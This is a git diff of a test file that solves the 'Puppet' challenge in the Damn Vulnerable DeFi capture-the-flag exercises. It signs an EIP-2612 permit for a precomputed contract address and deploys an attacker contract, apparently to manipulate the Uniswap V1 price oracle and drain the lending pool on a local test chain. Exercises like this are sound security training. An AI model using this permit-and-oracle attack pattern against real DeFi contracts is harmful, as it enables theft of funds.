@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const ethUtils = require('ethereumjs-util');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -95,13 +96,57 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        // not completed yet
-        await token.transfer(uniswapExchange.address, 100000n * 10n ** 18n);
-        await (await ethers.getContractFactory('Taker', player)).deploy(
-            token.address, uniswapExchange.address, lendingPool.address,
-            {value: 20n * 10n ** 18n, gasLimit: 1e6}
-        );
+        const owner = player.address;
+        const spender = "0x8464135c8F25Da09e49BC8782676a84730C318bC";
+        const value = PLAYER_INITIAL_TOKEN_BALANCE;
+        const deadline = 2n * 10n ** 10n;
         
+        // EIP-712 typed structure: https://eips.ethereum.org/EIPS/eip-2612
+        const domain = {
+            "name": 'DamnValuableToken',
+            "version": '1',
+            "chainId": 31337,
+            "verifyingContract": token.address
+        };
+       
+        const types = {
+            "Permit": [{
+                "name": "owner",
+                "type": "address"
+                },
+                {
+                  "name": "spender",
+                  "type": "address"
+                },
+                {
+                  "name": "value",
+                  "type": "uint256"
+                },
+                {
+                  "name": "nonce",
+                  "type": "uint256"
+                },
+                {
+                  "name": "deadline",
+                  "type": "uint256"
+                }
+              ]
+        };
+
+        const message = {
+            "owner": owner,
+            "spender": spender,
+            "value": value,
+            "nonce": 0,
+            "deadline": deadline
+        };
+        // sign eip712 typed structure
+        const signature = await player._signTypedData(domain, types, message);
+
+        await (await ethers.getContractFactory('Taker', player)).deploy(
+            token.address, uniswapExchange.address, lendingPool.address, signature,
+            {value: 20n * 10n ** 18n, gasLimit: 1e7}
+        );
     });
 
     after(async function () {
